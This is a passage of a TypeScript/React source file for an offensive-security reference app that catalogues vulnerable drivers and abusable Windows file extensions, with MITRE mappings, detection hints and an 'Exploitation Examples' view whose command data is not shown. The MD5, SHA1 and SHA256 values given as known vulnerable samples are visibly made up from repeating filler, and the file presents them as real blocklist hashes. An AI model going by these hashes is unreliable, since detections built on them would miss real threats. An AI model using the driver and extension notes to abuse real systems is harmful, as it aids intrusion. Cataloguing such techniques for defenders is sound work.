      "https://www.cisa.gov/news-events/cybersecurity-advisories",
      "https://www.loldrivers.io/"
    ],
    "Detection": [
      "Blocklist: Hash - 09f8a786b9e6e4ebbe2a0a5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c",
      "Behavior: Driver loading with suspicious parent process"
    ]
  },
  {
    "Id": "nvflash",
    "Author": "NVIDIA",
    "Created": "2022-11-30",
    "Version": "5.590.0.1",
    "Category": "vulnerable driver",
    "Verified": "TRUE",
    "Description": "NVIDIA BIOS flashing utility driver. Allows arbitrary kernel memory access.",
    "Tags": ["NVIDIA", "nvflash", "GPU", "BIOS", "firmware"],
    "KnownVulnerableSamples": [
      {
        "Filename": "nvflash.sys",
        "MD5": "7e3e0c8a7e7e7e7e7e7e7e7e7e7e7e7e",
        "SHA1": "1f7b6679f87b4b4f9f4c0c5c5c5c5c5c5c5c5c5c",
        "SHA256": "10f8a786b9e6e4ebbe2a0a5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c",
        "Signature": "NVIDIA Corporation",
        "Date": "2021-01-01",
        "Publisher": "NVIDIA Corporation",
        "Company": "NVIDIA Corporation",
        "Description": "NVIDIA Flash Utility Driver",
        "Product": "NVIDIA Flash Driver",
        "MachineType": "AMD64"
      }
    ],
    "CVE": [],
    "Resources": [
      "https://www.nvidia.com/"
    ],
    "Detection": [
      "Driver Load: nvflash.sys loaded outside of official flashing tools",
      "File Creation: nvflash.sys in unexpected locations"
    ]
  },
  {
    "Id": "IObitUnlocker",
    "Author": "IObit",
    "Created": "2022-12-15",
    "Version": "1.3.0.0",
    "Category": "vulnerable driver",
    "Verified": "TRUE",
    "Description": "IObit Unlocker driver. Allows file deletion and manipulation of protected files.",
    "Tags": ["IObit", "Unlocker", "file", "deletion"],
    "KnownVulnerableSamples": [
      {
        "Filename": "IObitUnlocker.sys",
        "MD5": "8e3e0c8a7e7e7e7e7e7e7e7e7e7e7e7e",
        "SHA1": "0f7b6679f87b4b4f9f4c0c5c5c5c5c5c5c5c5c5c",
        "SHA256": "11f8a786b9e6e4ebbe2a0a5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c",
        "Signature": "IObit Information Technology",
        "Date": "2020-01-01",
        "Publisher": "IObit Information Technology",
        "Company": "IObit",
        "Description": "IObit Unlocker Driver",
        "Product": "IObit Unlocker",
        "MachineType": "AMD64"
      }
    ],
    "CVE": [],
    "Resources": [
      "https://www.iobit.com/en/iobit-unlocker.html"
    ],
    "Detection": [
      "Driver Load: IObitUnlocker.sys loaded",
      "Registry: HKLM\\System\\CurrentControlSet\\Services\\IObitUnlocker"
    ]
  }
];

// ==================== LOLGLOBS DATA (Dangerous File Extensions & Handlers) ====================
const GLOBS_DATA = [
  {
    "id": "1",
    "extension": ".scr",
    "description": "Windows screensaver file. Executable format that runs automatically when opened.",
    "handler": "Shell32.dll",
    "risk": "High",
    "mitre": ["T1204.001", "T1059.001"],
    "tags": ["executable", "screensaver", "auto-run"],
    "detection": ["File creation monitoring for .scr outside System32", "Process creation from .scr files"],
    "references": ["https://0xv1n.github.io/LOLGlobs/"]
  },
  {
    "id": "2",
    "extension": ".pif",
    "description": "Program Information File. Legacy shortcut format that can execute commands.",
    "handler": "Shell32.dll",
    "risk": "High",
    "mitre": ["T1204.001"],
    "tags": ["executable", "shortcut", "legacy"],
    "detection": ["File creation monitoring for .pif files", "Unusual process execution from .pif"],
    "references": ["https://0xv1n.github.io/LOLGlobs/"]
  },
  {
    "id": "3",
    "extension": ".com",
    "description": "Legacy DOS executable format. Still supported by Windows and can execute code.",
    "handler": "ntvdm.exe / cmd.exe",
    "risk": "High",
    "mitre": ["T1059"],
    "tags": ["executable", "dos", "legacy"],
    "detection": ["Execution of .com files in modern Windows environments", "File creation in startup folders"],
    "references": ["https://0xv1n.github.io/LOLGlobs/"]
  },
  {
    "id": "4",
    "extension": ".cpl",
    "description": "Control Panel Item. Can execute code when opened via Control Panel.",
    "handler": "Shell32.dll / control.exe",
    "risk": "High",
    "mitre": ["T1218.002"],
    "tags": ["executable", "control-panel", "library"],
    "detection": ["Loading of non-standard CPL files", "Registry changes to CPL paths"],
    "references": ["https://0xv1n.github.io/LOLGlobs/", "https://lolbas-project.github.io/lolbas/Binaries/Control/"]
  },
  {
    "id": "5",
    "extension": ".msc",
    "description": "Microsoft Management Console snap-in. Can execute scripts and commands.",
    "handler": "mmc.exe",
    "risk": "Medium",
    "mitre": ["T1218.003"],
    "tags": ["executable", "mmc", "snap-in"],
    "detection": ["MMC loading non-standard .msc files", "Suspicious MMC process creations"],
    "references": ["https://0xv1n.github.io/LOLGlobs/", "https://lolbas-project.github.io/lolbas/Binaries/Mmc/"]
  },
  {
    "id": "6",
    "extension": ".hta",
    "description": "HTML Application. Executes with full trust and can access Windows Script Host.",
    "handler": "mshta.exe",
    "risk": "Critical",
    "mitre": ["T1059.007", "T1218.005"],
    "tags": ["executable", "html", "script", "trusted"],
    "detection": ["MSHTA execution from temp directories", "HTA files downloaded from internet", "mshta.exe command line with scripts"],
    "references": ["https://0xv1n.github.io/LOLGlobs/", "https://lolbas-project.github.io/lolbas/Binaries/Mshta/"]
  },
  {
    "id": "7",
    "extension": ".chm",
    "description": "Compiled HTML Help. Can execute JavaScript and VBScript via shortcuts.",
    "handler": "hh.exe",
    "risk": "Medium",
    "mitre": ["T1059.007", "T1218.001"],
    "tags": ["executable", "help", "html", "compiled"],
    "detection": ["Remote CHM file access", "HH.exe with suspicious command lines", "CHM files in temp directories"],
    "references": ["https://0xv1n.github.io/LOLGlobs/", "https://lolbas-project.github.io/lolbas/Binaries/Hh/"]
  },
  {
    "id": "8",
    "extension": ".js",
    "description": "JScript file. Executed via Windows Script Host or MSHTA.",
    "handler": "wscript.exe / mshta.exe",
    "risk": "Medium",
    "mitre": ["T1059.007"],
    "tags": ["script", "javascript", "jscript", "wsh"],
    "detection": ["Wscript/Cscript execution of JS from temp", "Obfuscated JS files"],
    "references": ["https://0xv1n.github.io/LOLGlobs/"]
  },
  {
    "id": "9",
    "extension": ".jse",
    "description": "JScript Encoded Script. Encoded JavaScript that can evade simple detection.",
    "handler": "wscript.exe",
    "risk": "High",
    "mitre": ["T1059.007", "T1027"],
    "tags": ["script", "encoded", "javascript", "jscript"],
    "detection": ["Execution of .jse files", "Wscript with encoded script extensions"],
    "references": ["https://0xv1n.github.io/LOLGlobs/"]
  },
  {
    "id": "10",
    "extension": ".vbs",
    "description": "VBScript file. Executed via Windows Script Host.",
    "handler": "wscript.exe / cscript.exe",
    "risk": "Medium",
    "mitre": ["T1059.005"],
    "tags": ["script", "vbscript", "vbs", "wsh"],
    "detection": ["Wscript/Cscript execution from unusual paths", "VBS files in startup locations"],
    "references": ["https://0xv1n.github.io/LOLGlobs/"]
  },
  {
    "id": "11",
    "extension": ".vbe",
    "description": "VBScript Encoded Script. Encoded VBScript to evade detection.",
    "handler": "wscript.exe",
    "risk": "High",
    "mitre": ["T1059.005", "T1027"],
    "tags": ["script", "encoded", "vbscript", "vbs"],
    "detection": ["Execution of .vbe files", "Encoded VBScript usage"],
    "references": ["https://0xv1n.github.io/LOLGlobs/"]
  },
  {
    "id": "12",
    "extension": ".wsf",
    "description": "Windows Script File. Can contain a mix of JScript and VBScript.",
    "handler": "wscript.exe",
    "risk": "Medium",
    "mitre": ["T1059.007"],
    "tags": ["script", "wsf", "windows-script", "mixed"],
    "detection": ["WSF execution from temp directories", "Remote WSF file execution"],
    "references": ["https://0xv1n.github.io/LOLGlobs/"]
  },
  {
    "id": "13",
    "extension": ".wsh",
    "description": "Windows Script Host Settings File. Can specify script properties.",
    "handler": "wscript.exe",
    "risk": "Low",
    "mitre": ["T1059"],
    "tags": ["script", "wsh", "settings", "configuration"],
    "detection": ["WSH files associated with script execution"],
    "references": ["https://0xv1n.github.io/LOLGlobs/"]
  },
  {
    "id": "14",
    "extension": ".ps1",
    "description": "PowerShell script. Executed via powershell.exe.",
    "handler": "powershell.exe",
    "risk": "Medium",
    "mitre": ["T1059.001"],
    "tags": ["script", "powershell", "ps1", "automation"],
    "detection": ["PowerShell execution with encoded commands", "PS1 files in temp directories", "Download-cradle patterns"],
    "references": ["https://0xv1n.github.io/LOLGlobs/", "https://lolbas-project.github.io/lolbas/Binaries/Powershell/"]
  },
  {
    "id": "15",
    "extension": ".bat",
    "description": "Batch file. Executed via cmd.exe.",
    "handler": "cmd.exe",
    "risk": "Low",
    "mitre": ["T1059.003"],
    "tags": ["script", "batch", "cmd", "legacy"],
    "detection": ["Batch files executing from temp directories", "Obfuscated batch commands"],
    "references": ["https://0xv1n.github.io/LOLGlobs/"]
  },
  {
    "id": "16",
    "extension": ".cmd",
    "description": "Windows Command Script. Similar to .bat, executed via cmd.exe.",
    "handler": "cmd.exe",
    "risk": "Low",
    "mitre": ["T1059.003"],
    "tags": ["script", "batch", "cmd", "command"],
    "detection": ["CMD files in startup locations", "Suspicious cmd.exe child processes"],
    "references": ["https://0xv1n.github.io/LOLGlobs/"]
  },
  {
    "id": "17",
    "extension": ".url",
    "description": "Internet Shortcut. Can point to executable files or remote code.",
    "handler": "Shell32.dll / ieframe.dll",
    "risk": "Medium",
    "mitre": ["T1204.001"],
    "tags": ["shortcut", "url", "internet", "link"],
    "detection": ["URL files pointing to local executables", "Suspicious URL file modifications"],
    "references": ["https://0xv1n.github.io/LOLGlobs/"]
  },
  {
    "id": "18",
    "extension": ".lnk",
    "description": "Windows Shortcut. Can execute arbitrary commands and arguments.",
    "handler": "Shell32.dll",
    "risk": "Medium",
    "mitre": ["T1204.001", "T1547.001"],
    "tags": ["shortcut", "lnk", "link", "startup"],
    "detection": ["LNK files in startup folders", "LNK with PowerShell/Script targets", "Suspicious LNK icon paths"],
    "references": ["https://0xv1n.github.io/LOLGlobs/"]
  },
  {
    "id": "19",
    "extension": ".scf",
    "description": "Windows Explorer Command. Can execute commands via ShowCommands.",
    "handler": "Shell32.dll",
    "risk": "Medium",
    "mitre": ["T1204.001"],
    "tags": ["command", "scf", "explorer", "legacy"],
    "detection": ["SCF files in strategic locations", "IconFile pointing to remote resources"],
    "references": ["https://0xv1n.github.io/LOLGlobs/"]
  },
  {
    "id": "20",
    "extension": ".searchConnector-ms",
    "description": "Windows Search Connector. Can load remote resources and execute code.",
    "handler": "SearchProtocolHost.exe",
    "risk": "Medium",
    "mitre": ["T1204.001"],
    "tags": ["search", "connector", "library"],
    "detection": ["Search connector files loading remote content"],
    "references": ["https://0xv1n.github.io/LOLGlobs/"]
  },
  {
    "id": "21",
    "extension": ".library-ms",
    "description": "Windows Library. Can redirect to remote resources via iconReference.",
    "handler": "Shell32.dll",
    "risk": "Medium",
    "mitre": ["T1204.001"],
    "tags": ["library", "folder", "redirect"],
    "detection": ["Library files with remote icon references"],
    "references": ["https://0xv1n.github.io/LOLGlobs/"]
  },
  {
    "id": "22",
    "extension": ".inf",
    "description": "Setup Information File. Can execute commands via install sections.",
    "handler": "infdefaultinstall.exe / cmstp.exe",
    "risk": "High",
    "mitre": ["T1218.003", "T1553.005"],
    "tags": ["install", "inf", "setup", "configuration"],
    "detection": ["INF file execution via infdefaultinstall", "CMSTP loading INF files", "Registry Run keys with INF"],
    "references": ["https://0xv1n.github.io/LOLGlobs/", "https://lolbas-project.github.io/lolbas/Binaries/InfDefaultInstall/"]
  },
  {
    "id": "23",
    "extension": ".sct",
    "description": "Windows Script Component. XML format that can contain script code.",
    "handler": "regsvr32.exe / scrobj.dll",
    "risk": "Critical",
    "mitre": ["T1218.010", "T1059.007"],
    "tags": ["script", "com", "component", "registration"],
    "detection": ["Regsvr32 loading .sct files", "SCT files with embedded script", "Remote SCT execution (Squiblytwo)"],
    "references": ["https://0xv1n.github.io/LOLGlobs/", "https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/"]
  },
  {
    "id": "24",
    "extension": ".ws",
    "description": "Windows Script. Can be executed via Windows Script Host.",
    "handler": "wscript.exe",
    "risk": "Medium",
    "mitre": ["T1059"],
    "tags": ["script", "ws", "windows-script"],
    "detection": ["WS file execution from unusual locations"],
    "references": ["https://0xv1n.github.io/LOLGlobs/"]
  },
  {
    "id": "25",
    "extension": ".xbap",
    "description": "XAML Browser Application. Can execute with ClickOnce.",
    "handler": "PresentationHost.exe",
    "risk": "Medium",
    "mitre": ["T1059"],
    "tags": ["application", "xaml", "browser", "clickonce"],
    "detection": ["XBAP files downloaded from internet", "PresentationHost execution"],
    "references": ["https://0xv1n.github.io/LOLGlobs/"]
  },
  {
    "id": "26",
    "extension": ".application",
    "description": "ClickOnce Deployment Manifest. Can install and execute applications.",
    "handler": "dfshim.dll",
    "risk": "Medium",
    "mitre": ["T1218.011"],
    "tags": ["clickonce", "manifest", "deployment", "install"],
    "detection": ["ClickOnce installation from remote sources", "Dfshim.dll loading remote manifests"],
    "references": ["https://0xv1n.github.io/LOLGlobs/", "https://lolbas-project.github.io/lolbas/Libraries/Dfshim/"]
  },
  {
    "id": "27",
    "extension": ".gadget",
    "description": "Windows Sidebar Gadget. Can execute HTML/Script code.",
    "handler": "sidebar.exe",
    "risk": "Medium",
    "mitre": ["T1059"],
    "tags": ["gadget", "sidebar", "html", "script", "legacy"],
    "detection": ["Gadget installation on modern Windows", "Sidebar.exe execution"],
    "references": ["https://0xv1n.github.io/LOLGlobs/"]
  },
  {
    "id": "28",
    "extension": ".dll",
    "description": "Dynamic Link Library. Can be executed via rundll32, regsvr32, or other LOLBAS.",
    "handler": "rundll32.exe / regsvr32.exe",
    "risk": "High",
    "mitre": ["T1218.011", "T1218.010"],
    "tags": ["library", "dll", "executable", "module"],
    "detection": ["Rundll32 executing unknown DLLs", "Regsvr32 with remote DLLs", "DLL loading from temp directories"],
    "references": ["https://0xv1n.github.io/LOLGlobs/", "https://lolbas-project.github.io/lolbas/Binaries/Rundll32/"]
  },
  {
    "id": "29",
    "extension": ".ocx",
    "description": "OLE Control Extension. ActiveX control format similar to DLL.",
    "handler": "regsvr32.exe",
    "risk": "High",
    "mitre": ["T1218.010"],
    "tags": ["activex", "ocx", "control", "com"],
    "detection": ["OCX registration via regsvr32 from unusual paths"],
    "references": ["https://0xv1n.github.io/LOLGlobs/"]
  },
  {
    "id": "30",
    "extension": ".xll",
    "description": "Excel Add-in. Can execute code when loaded by Excel.",
    "handler": "excel.exe",
    "risk": "Medium",
    "mitre": ["T1137.006"],
    "tags": ["office", "excel", "add-in", "xll"],
    "detection": ["XLL files loaded from temp directories", "Excel loading unsigned XLL"],
    "references": ["https://0xv1n.github.io/LOLGlobs/"]
  },
  {
    "id": "31",
    "extension": ".wll",
    "description": "Word Add-in. Can execute code when loaded by Word.",
    "handler": "winword.exe",
    "risk": "Medium",
    "mitre": ["T1137.005"],
    "tags": ["office", "word", "add-in", "wll"],
    "detection": ["WLL files loaded from temp directories"],
    "references": ["https://0xv1n.github.io/LOLGlobs/"]
  },
  {
    "id": "32",
    "extension": ".iqy",
    "description": "Excel Web Query. Can pull remote data and execute commands.",
    "handler": "excel.exe",
    "risk": "High",
    "mitre": ["T1105", "T1204.001"],
    "tags": ["office", "excel", "query", "web", "data"],
    "detection": ["IQY files with remote URLs", "Excel making unexpected web connections"],
    "references": ["https://0xv1n.github.io/LOLGlobs/"]
  },
  {
    "id": "33",
    "extension": ".slk",
    "description": "Symbolic Link Spreadsheet. Excel format that can execute commands via DDE.",
    "handler": "excel.exe",
    "risk": "High",
    "mitre": ["T1204.001", "T1559.002"],
    "tags": ["office", "excel", "slk", "dde", "symbolic"],
    "detection": ["SLK files with embedded DDE", "Excel executing DDE commands"],
    "references": ["https://0xv1n.github.io/LOLGlobs/"]
  },
  {
    "id": "34",
    "extension": ".xlam",
    "description": "Excel Macro-Enabled Add-in. Can contain VBA macros.",
    "handler": "excel.exe",
    "risk": "Medium",
    "mitre": ["T1137.006", "T1059.005"],
    "tags": ["office", "excel", "macro", "add-in", "vba"],
    "detection": ["XLAM files from internet", "Macro execution from add-ins"],
    "references": ["https://0xv1n.github.io/LOLGlobs/"]
  },
  {
    "id": "35",
    "extension": ".msh1",
    "description": "Monad Shell Script (PowerShell predecessor). Legacy format.",
    "handler": "powershell.exe",
    "risk": "Medium",
    "mitre": ["T1059.001"],
    "tags": ["powershell", "msh", "monad", "legacy", "script"],
    "detection": ["MSH1 file execution"],
    "references": ["https://0xv1n.github.io/LOLGlobs/"]
  }
];

// ==========================================
// MAIN COMPONENT
// ==========================================

export default function LivingOffTheLandArsenal() {
  // State Management
  const [activeTab, setActiveTab] = useState<'lolbas' | 'gtfo' | 'drivers' | 'globs'>('lolbas');
  const [searchQuery, setSearchQuery] = useState('');
  const [selectedItem, setSelectedItem] = useState<any>(null);
  const [copiedText, setCopiedText] = useState<string | null>(null);
  const [filterCategory, setFilterCategory] = useState('all');
  const [filterMitre, setFilterMitre] = useState('');
  const [showHelp, setShowHelp] = useState(false);

  // Copy to clipboard handler
  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text).then(() => {
      setCopiedText(text);
      setTimeout(() => setCopiedText(null), 2000);
    }).catch(err => {
      console.error('Failed to copy:', err);
      // Fallback for offline/airgapped environments
      const textarea = document.createElement('textarea');
      textarea.value = text;
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand('copy');
      document.body.removeChild(textarea);
      setCopiedText(text);
      setTimeout(() => setCopiedText(null), 2000);
    });
  };

  // Export data to JSON (for offline backup)
  const exportData = () => {
    const data = {
      lolbas: LOLBAS_DATA,
      gtfobins: GTFOBINS_DATA,
      drivers: DRIVERS_DATA,
      globs: GLOBS_DATA,
      exported_at: new Date().toISOString(),
      version: '1.0.0-offline'
    };
    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `lol-arsenal-backup-${new Date().toISOString().split('T')[0]}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  // Filter functions
  const filteredLOLBas = useMemo(() => {
    return LOLBAS_DATA.filter(item => {
      const matchesSearch = !searchQuery || 
        item.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
        item.description.toLowerCase().includes(searchQuery.toLowerCase()) ||
        item.commands.some(c => c.command.toLowerCase().includes(searchQuery.toLowerCase())) ||
        (item.category && item.category.toLowerCase().includes(searchQuery.toLowerCase()));
      
      const matchesCategory = filterCategory === 'all' || item.category === filterCategory;
      
      const matchesMitre = !filterMitre || 
        item.commands.some(c => 
          c.mitre?.technique.toLowerCase().includes(filterMitre.toLowerCase()) ||
          c.mitre?.tactic.toLowerCase().includes(filterMitre.toLowerCase())
        );
      
      return matchesSearch && matchesCategory && matchesMitre;
    });
  }, [searchQuery, filterCategory, filterMitre]);

  const filteredGTFO = useMemo(() => {
    return GTFOBINS_DATA.filter(item => {
      const matchesSearch = !searchQuery || 
        item.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
        item.description.toLowerCase().includes(searchQuery.toLowerCase()) ||
        item.functions.some(f => f.toLowerCase().includes(searchQuery.toLowerCase()));
      
      const matchesFunction = filterCategory === 'all' || item.functions.includes(filterCategory);
      
      return matchesSearch && matchesFunction;
    });
  }, [searchQuery, filterCategory]);

  const filteredDrivers = useMemo(() => {
    return DRIVERS_DATA.filter(item => {
      const matchesSearch = !searchQuery || 
        item.Id.toLowerCase().includes(searchQuery.toLowerCase()) ||
        item.Tags.some(t => t.toLowerCase().includes(searchQuery.toLowerCase())) ||
        item.Description.toLowerCase().includes(searchQuery.toLowerCase()) ||
        item.KnownVulnerableSamples.some(s => 
          s.Filename.toLowerCase().includes(searchQuery.toLowerCase()) ||
          s.SHA256.toLowerCase().includes(searchQuery.toLowerCase())
        );
      
      const matchesCategory = filterCategory === 'all' || item.Category === filterCategory;
      const matchesVerified = filterCategory === 'verified' ? item.Verified === "TRUE" : true;
      
      return matchesSearch && (matchesCategory || matchesVerified);
    });
  }, [searchQuery, filterCategory]);

  const filteredGlobs = useMemo(() => {
    return GLOBS_DATA.filter(item => {
      const matchesSearch = !searchQuery || 
        item.extension.toLowerCase().includes(searchQuery.toLowerCase()) ||
        item.description.toLowerCase().includes(searchQuery.toLowerCase()) ||
        item.handler?.toLowerCase().includes(searchQuery.toLowerCase()) ||
        item.tags.some(t => t.toLowerCase().includes(searchQuery.toLowerCase()));
      
      const matchesRisk = filterCategory === 'all' || item.risk === filterCategory;
      const matchesMitre = !filterMitre || item.mitre?.some(m => m.toLowerCase().includes(filterMitre.toLowerCase()));
      
      return matchesSearch && matchesRisk && matchesMitre;
    });
  }, [searchQuery, filterCategory, filterMitre]);

  // Get unique categories for filters
  const getCategories = () => {
    switch (activeTab) {
      case 'lolbas':
        return [...new Set(LOLBAS_DATA.map(i => i.category).filter(Boolean))];
      case 'gtfo':
        return [...new Set(GTFOBINS_DATA.flatMap(i => i.functions))];
      case 'drivers':
        return [...new Set(DRIVERS_DATA.map(i => i.Category))];
      case 'globs':
        return [...new Set(GLOBS_DATA.map(i => i.risk))];
      default:
        return [];
    }
  };

  // Render Detail Modal
  const renderDetailModal = () => {
    if (!selectedItem) return null;

    const isLolbas = activeTab === 'lolbas';
    const isGTFO = activeTab === 'gtfo';
    const isDriver = activeTab === 'drivers';
    const isGlob = activeTab === 'globs';

    return (
      <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm overflow-y-auto">
        <div className="relative w-full max-w-4xl max-h-[90vh] overflow-y-auto bg-slate-900 border border-slate-700 rounded-xl shadow-2xl">
          {/* Header */}
          <div className="sticky top-0 bg-slate-900/95 backdrop-blur border-b border-slate-700 p-6 flex items-start justify-between z-10">
            <div className="flex-1">
              <div className="flex items-center gap-3 mb-2">
                <h2 className="text-2xl font-bold text-white font-mono">
                  {isGTFO ? selectedItem.name : isDriver ? selectedItem.Id : isGlob ? selectedItem.extension : selectedItem.name}
                </h2>
                {(isLolbas || isDriver) && selectedItem.category && (
                  <span className="px-2 py-1 text-xs rounded bg-blue-500/20 text-blue-400 border border-blue-500/30">
                    {selectedItem.category}
                  </span>
                )}
                {isDriver && selectedItem.Verified === "TRUE" && (
                  <span className="px-2 py-1 text-xs rounded bg-green-500/20 text-green-400 border border-green-500/30 flex items-center gap-1">
                    <Shield className="w-3 h-3" /> Verified
                  </span>
                )}
                {isGlob && selectedItem.risk && (
                  <span className={`px-2 py-1 text-xs rounded border ${
                    selectedItem.risk === 'Critical' ? 'bg-red-500/20 text-red-400 border-red-500/30' :
                    selectedItem.risk === 'High' ? 'bg-orange-500/20 text-orange-400 border-orange-500/30' :
                    selectedItem.risk === 'Medium' ? 'bg-yellow-500/20 text-yellow-400 border-yellow-500/30' :
                    'bg-green-500/20 text-green-400 border-green-500/30'
                  }`}>
                    {selectedItem.risk} Risk
                  </span>
                )}
              </div>
              <p className="text-slate-400 text-sm">
                {isGTFO ? selectedItem.description : isDriver ? selectedItem.Description : selectedItem.description}
              </p>
            </div>
            <button 
              onClick={() => setSelectedItem(null)}
              className="p-2 hover:bg-slate-800 rounded-lg transition-colors text-slate-400 hover:text-white"
            >
              <X className="w-6 h-6" />
            </button>
          </div>

          <div className="p-6 space-y-6">
            {/* LOLBAS Specific */}
            {isLolbas && (
              <>
                <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-4">
                  <h3 className="font-semibold text-blue-400 mb-2 flex items-center gap-2">
                    <Terminal className="w-4 h-4" />
                    Commands ({selectedItem.commands?.length || 0})
                  </h3>
                  <div className="space-y-3">
                    {selectedItem.commands?.map((cmd: any, idx: number) => (
                      <div key={idx} className="bg-slate-950 border border-slate-800 rounded-lg p-4">
                        <div className="flex items-center justify-between mb-2">
                          <span className="text-xs text-blue-400 font-medium">{cmd.description}</span>
                          <div className="flex gap-2">
                            <span className="text-xs px-2 py-1 bg-slate-800 rounded text-slate-300">
                              {cmd.privileges}
                            </span>
                            {cmd.mitre && (
                              <span className="text-xs px-2 py-1 bg-amber-500/10 text-amber-400 rounded border border-amber-500/20">
                                {cmd.mitre.technique}
                              </span>
                            )}
                          </div>
                        </div>
                        <div className="relative group">
                          <pre className="bg-black/50 p-3 rounded-lg text-sm font-mono text-green-400 overflow-x-auto border border-slate-800">
                            {cmd.command}
                          </pre>
                          <button 
                            onClick={() => handleCopy(cmd.command)}
                            className="absolute top-2 right-2 p-2 bg-slate-800 hover:bg-slate-700 rounded text-slate-400 hover:text-white transition-all opacity-0 group-hover:opacity-100"
                            title="Copy command"
                          >
                            {copiedText === cmd.command ? <Check className="w-4 h-4 text-green-400" /> : <Copy className="w-4 h-4" />}
                          </button>
                        </div>
                        <p className="text-xs text-slate-500 mt-2">{cmd.usecase}</p>
                        {cmd.mitre && (
                          <div className="flex gap-2 mt-2">
                            <span className="text-xs px-2 py-1 bg-slate-800 text-slate-400 rounded">
                              Tactic: {cmd.mitre.tactic}
                            </span>
                          </div>
                        )}
                      </div>
                    ))}
                  </div>
                </div>

                {selectedItem.full_path && selectedItem.full_path.length > 0 && (
                  <div>
                    <h3 className="font-semibold text-slate-300 mb-3 flex items-center gap-2">
                      <HardDrive className="w-4 h-4 text-slate-400" />
                      Paths
                    </h3>
                    <ul className="space-y-2">
                      {selectedItem.full_path.map((path: string, idx: number) => (
                        <li key={idx} className="text-sm font-mono text-slate-400 bg-slate-950 p-2 rounded border border-slate-800 flex items-center gap-2">
                          <FileText className="w-3 h-3 text-slate-500" />
                          {path}
                        </li>
                      ))}
                    </ul>
                  </div>
                )}

                {selectedItem.detection && selectedItem.detection.length > 0 && (
                  <div>
                    <h3 className="font-semibold text-slate-300 mb-3 flex items-center gap-2">
                      <Eye className="w-4 h-4 text-slate-400" />
                      Detection Rules ({selectedItem.detection.length})
                    </h3>
                    <div className="space-y-3">
                      {selectedItem.detection.map((det: any, idx: number) => (
                        <div key={idx} className="bg-slate-950 border border-slate-800 rounded-lg p-4">
                          <p className="text-sm text-slate-300 mb-2">{det.description}</p>
                          {det.sigma && (
                            <div className="relative group">
                              <pre className="bg-black/50 p-3 rounded text-xs font-mono text-yellow-500/90 overflow-x-auto border border-slate-800">
                                {det.sigma}
                              </pre>
                              <button 
                                onClick={() => handleCopy(det.sigma)}
                                className="absolute top-2 right-2 p-1.5 bg-slate-800 hover:bg-slate-700 rounded text-slate-400 hover:text-white transition-all opacity-0 group-hover:opacity-100"
                              >
                                {copiedText === det.sigma ? <Check className="w-3 h-3 text-green-400" /> : <Copy className="w-3 h-3" />}
                              </button>
                            </div>
                          )}
                        </div>
                      ))}
                    </div>
                  </div>
                )}

                {selectedItem.resources && selectedItem.resources.length > 0 && (
                  <div className="flex items-center gap-2 text-sm">
                    <ExternalLink className="w-4 h-4 text-slate-400" />
                    <span className="text-slate-400">Reference:</span>
                    <a 
                      href={selectedItem.resources[0].link} 
                      target="_blank" 
                      rel="noopener noreferrer"
                      className="text-blue-400 hover:text-blue-300 hover:underline"
                    >
                      LOLBAS Project
                    </a>
                  </div>
                )}
              </>
            )}

            {/* GTFOBins Specific */}
            {isGTFO && (
              <>
                <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-4">
                  <h3 className="font-semibold text-yellow-500 mb-3 flex items-center gap-2">
                    <Zap className="w-4 h-4" />
                    Functions ({selectedItem.functions?.length || 0})
                  </h3>
                  <div className="flex flex-wrap gap-2 mb-4">
                    {selectedItem.functions?.map((func: string, idx: number) => (
                      <span key={idx} className="px-3 py-1 bg-yellow-500/10 text-yellow-400 rounded-full text-sm border border-yellow-500/20">
                        {func}
                      </span>
                    ))}
                  </div>
                </div>

                <div className="space-y-3">
                  <h3 className="font-semibold text-slate-300 flex items-center gap-2">
                    <Terminal className="w-4 h-4" />
                    Exploitation Examples
                  </h3>
                  {selectedItem.commands?.map((cmd: any, idx: number) => (
                    <div key={idx} className="bg-slate-950 border border-slate-800 rounded-lg p-4">
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-xs px-2 py-1 bg-yellow-500/10 text-yellow-400 rounded border border-yellow-500/20 uppercase">
                          {cmd.function}
                        </span>
                      </div>
                      <div className="relative group">
                        <pre className="bg-black/50 p-3 rounded text-sm font-mono text-green-400 overflow-x-auto">
                          {cmd.command}
                        </pre>
                        <button 
                          onClick={() => handleCopy(cmd.command)}
                          className="absolute top-2 right-2 p-2 bg-slate-800 hover:bg-slate-700 rounded text-slate-400 hover:text-white transition-all opacity-0 group-hover:opacity-100"
                        >
                          {copiedText === cmd.command ? <Check className="w-4 h-4 text-green-400" /> : <Copy className="w-4 h-4" />}
                        </button>
                      </div>
                      <p className="text-xs text-slate-500 mt-2">{cmd.description}</p>
                    </div>
                  ))}
                </div>

                <div className="flex items-center gap-2 text-sm">
                  <ExternalLink className="w-4 h-4 text-slate-400" />
                  <span className="text-slate-400">Reference:</span>
                  <a 
                    href={selectedItem.url} 
                    target="_blank" 
                    rel="noopener noreferrer"
                    className="text-blue-400 hover:text-blue-300 hover:underline"
                  >
                    GTFOBins
                  </a>
                </div>
              </>
            )}

            {/* Drivers Specific */}
            {isDriver && (
              <>
                <div className="bg-red-500/10 border border-red-500/20 rounded-lg p-4">
                  <div className="flex items-center gap-2 text-red-400 mb-2">
                    <Skull className="w-5 h-5" />
                    <span className="font-semibold">Vulnerable Driver Alert</span>
                  </div>
                  <p className="text-slate-300 text-sm">{selectedItem.Description}</p>
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="bg-slate-950 p-3 rounded-lg border border-slate-800">
                    <span className="text-xs text-slate-500">Category</span>
                    <p className="font-medium text-slate-300 capitalize">{selectedItem.Category}</p>
                  </div>
                  <div className="bg-slate-950 p-3 rounded-lg border border-slate-800">
                    <span className="text-xs text-slate-500">Verified</span>
